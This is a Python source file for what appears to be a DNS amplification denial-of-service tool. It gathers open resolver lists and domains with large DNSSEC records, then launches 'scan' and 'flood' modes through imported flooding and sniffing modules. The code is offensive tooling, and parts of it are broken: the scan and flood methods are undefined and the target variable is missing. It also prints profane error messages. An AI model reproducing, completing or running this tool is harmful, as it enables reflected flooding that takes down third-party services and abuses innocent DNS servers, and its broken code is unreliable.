import sys
import os
import requests
import re
from multiprocessing import Process, Queue, Value , Array
from ctypes import c_bool , create_string_buffer


from dns_flood import DNSFlood
from sniffer import IPSniff
from packet_consumer import Packet_Consumer

class Argument_Processor:

	def __init__(self):
		self.start_pack_status = Array( "c" , 200 , lock=False) #makes a character array that is shareable between processes

	def process_args( self , args ):
		if len( args ) < 2:
			print( "type \"python amplifier.py --help\" for help.")
			exit(1)

		if args[1] == "starter-pack":
			
			if len(args) < 3:
				print("Please provide a directory to save the starter pack")
				exit(1)

			dir = args[2]
			#check if directory  exists or not
			if os.path.isdir( dir ):
				self.get_starter_pack( dir )
			elif os.path.exists( dir ):
				print( dir + " is not a directory" )
			else: #wasnt a directory and doesnt exist, create the directory and get starter pack
				try:
					os.mkdir( dir )
					self.get_starter_pack( dir )
				except:
					print( dir + " is not a valid path" )
			exit(1)

		#this is linux specific
		network_interfaces = os.listdir('/sys/class/net/')

		if args[1] == "scan" or args[1] == "flood":
			if len(args) < 6:
				print("fuck you")
				exit(1)

			server_list = []
			domain_list = []
			net_iface = None

			for x in range( 2 , len(args) - 1 , 1 ):
				arg = args[x]
				if arg == "--server":
					server_list.append( args[x+1] )
				if arg == "--domain":
					domain_list.append( args[x+1] )
				if arg == "--server-list":
					try:
						server_list += open( args[x+1] , "r" ).read().split("\n")
						del server_list[-1]
					except FileNotFoundError:
						print( "Cannot find " + args[x+1] )
						exit(1)
				if arg == "--domain-list":
					try:
						domain_list += open( args[x+1] , "r" ).read().split("\n")
						del domain_list[-1]
					except FileNotFoundError:
						print( "Cannot find " + args[x+1] )
						exit(1)

			for iface in network_interfaces:
				if iface in sys.argv:
					net_iface = iface

			if net_iface == None:
				print("Please provide a network interface.")
				exit(1)
			if len(server_list) == 0:
				print( "Provide dns servers to scan" )
				exit(1)
			if len(domain_list) == 0:
				print( "Provide domains for retrieving dns records" )
			
			if args[1] == "scan":
				self.scan( server_list , domain_list , net_iface )
			elif args[1] == "flood":
				self.flood( server_list , domain_list, target , net_iface )

		print( "God damn you fucked up the arguments.  type: python amplifier.py --help" )

	def get_starter_pack( self ,dir ):
		dir = os.path.join( os.path.expanduser( dir ) , "starter-pack" )
		if not os.path.exists( dir ):
			os.mkdir( dir )
		self.get_servers( dir )
		self.get_domains( dir )
		self.update_status( self.start_pack_status , "finished" )

	def get_servers( self , dir ):
		self.update_status( self.start_pack_status ,  "Retrieving list of open DNS servers from https://public-dns.info/nameservers-all.txt")

		servers = requests.get("https://public-dns.info/nameservers-all.txt").text.split("\n")
		servers.pop()

		file = open( os.path.join( dir , "ipv4_dns_servers" ) , "w" )
		file2 = open( os.path.join( dir , "ipv6_dns_servers" ) , "w" )

		for server in servers:
	        	if "." in server:
	                	file.write( server + "\n" )
	        	else:
	                	file2.write( server + "\n" )

	def get_domains( self , dir ):
		base="https://usgv6-deploymon.antd.nist.gov/cgi-bin/generate-"
		rest = ["com","gov","edu"]

		for ext in rest:
			self.update_status( self.start_pack_status , "Retrieving domains likely to have dnssec(big) records from " + base + ext )
			r = requests.get( base + ext )

			if r.status_code != requests.codes.ok:
				self.update_status( self.start_pack_status , "Failure to get websites for tld: " + ext )
				continue

			file = open( dir+"/"+ext+"_domains" , "w" )

			#print( "Parsing " + ext + " domains" )

			sites = re.findall(  "ANTD-0>.+?TD", r.text )
			regex = re.compile( ">"+ext+"\.[^\.]+" )

			for site in sites:
				matcher = regex.search( site )
				try:
					string = matcher.group().replace( ">"+ext+"." , "" ) + "."+ ext
	                        	#print( matcher.group(0) + " : " + string )
					file.write( string+"\n" )
				except AttributeError: #matcher was None
					pass

			file.close()

	def update_status( self , string_buffer , new_status ):
		string_buffer.value = new_status.encode( "ascii" )
		print( new_status )

	def get_her_done( self , server_list , domain_list , iface ):
		terminate_flag = Value( c_bool , False )
		sniffed_queue = Queue()

		sender_process = DNSFlood( server_list , domain_list , "scan" , terminate_flag )
		sniffer_process = IPSniff( iface , sniffed_queue , terminate_flag )
		consumer_process = Packet_Consumer( sniffed_queue , terminate_flag )

		sniffer_process.start()
		consumer_process.start()
		sender_process.start()

		while True:
			if not sender_process.is_alive():
				terminate_flag.value = True
				print( "Finished sending packets" )
				break
		exit(0)

if __name__ == "__main__":
	arg_processor = Argument_Processor()
	arg_processor.process_args( sys.argv )

